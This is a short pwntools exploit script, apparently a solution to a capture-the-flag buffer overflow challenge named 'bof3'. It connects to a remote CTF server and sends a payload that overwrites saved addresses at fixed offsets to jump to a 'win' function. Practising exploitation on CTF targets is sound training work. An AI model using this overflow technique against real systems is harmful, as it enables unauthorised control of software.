from pwn import *

exe = context.binary = ELF('bof3')
winaddr = 0x8049256
io = remote("ctf.hackucf.org", 9002)

fram = 0x08049250
payload = fit({
    64: fram,
    80: winaddr,

})

io.sendline(payload)
print(io.recvline())